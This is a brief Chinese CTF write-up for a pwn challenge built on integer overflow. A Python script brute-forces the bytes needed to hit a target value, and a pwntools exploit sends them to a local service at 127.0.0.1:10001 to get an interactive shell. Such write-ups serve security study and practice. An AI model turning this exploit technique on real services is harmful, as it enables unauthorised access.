考察点：整形溢出

利用以下脚本计算出对应的字符串。
```python
end = '2029bc3c'

import sys   
sys.setrecursionlimit(1000000)

def get(end):
	if end == 1234:
		return True
	if end <1234:
		return False
	if (end - 12) % 34 !=0:
		return False
	for x in xrange(1,0xff+1):
		flag = get((end - 12) / 34 -x)
		if flag:
			print hex(end),hex(x)
			return True
		else:
			continue
				
for x in xrange(0,0xfffffff):
	tmp  = int(hex(x).replace('0x','')+end,16)
	if get(tmp):
		print 'end'
```

构造exp如下

```python
from pwn import *

# context(log_level="debug")
# p = process('./pwn5')
p = remote('127.0.0.1',10001)
p.recvuntil('\n')
p.sendline('1234')
p.recvuntil('\n')
p.sendline('\x64\x1f\x08\x19\x1a')
p.interactive()
```